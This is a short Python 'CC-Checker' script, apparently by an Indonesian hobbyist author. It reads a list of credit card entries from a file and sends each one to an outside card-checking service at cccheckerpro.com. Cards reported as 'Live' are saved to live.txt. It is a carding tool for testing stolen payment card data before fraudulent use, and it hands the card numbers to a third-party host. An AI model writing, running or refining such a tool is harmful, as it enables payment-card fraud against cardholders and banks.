######################################
# Hasil kegabutan yang hakiki        #
# Wuhh istrinya kang rekode;v        #
# Author : By X - MrG3P5             #
# Github : https://github.com/MrG3P5 #
######################################
import os
from gazpacho import Soup

brblue = '\x1b[94m'
white = '\x1b[37m'
green = '\x1b[32m'

def banner():
    my_banner = '''{}  ____ ____       ____ _               _             
 / ___/ ___|     / ___| |__   ___  ___| | _____ _ __ 
| |  | |   _____| |   | '_ \ / _ \/ __| |/ / _ \ '__|
| |__| |__|_____| |___| | | |  __/ (__|   <  __/ | {}Created By  
 {}\____\____|     \____|_| |_|\___|\___|_|\_\___|_| {}> X - MrG3P5'''.format(brblue, white, brblue, white)
    print(my_banner)

if __name__=='__main__':
    banner()
    ask_list = input('\n{}[{}?{}] List cc (ex: list.txt): {}'.format(brblue, white, brblue, white))
    if os.path.exists(ask_list):
        with open (ask_list,'r') as f:
            cc_live = []
            cc_list = [line.strip() for line in f]
            cc_list_length = len(cc_list)
            for i in range(cc_list_length):
                soup = Soup.get('https://cccheckerpro.com/api.php?lista='+cc_list[i])
                ress = soup.find("b").text
                if ress == 'Live':
                        cc_live.append(cc_list[i])
                        print('{}[{}LIVE{}] {}'.format(brblue, green, brblue, white) + cc_list[i])
        with open("live.txt", "w") as outfile:
            outfile.write("\n".join(str(item) for item in cc_live))
            print('\nSuccessfully saved to live.txt file with a total of {} Live'.format(len(cc_live)))
    else:
        print('File Not Found!')
        exit()
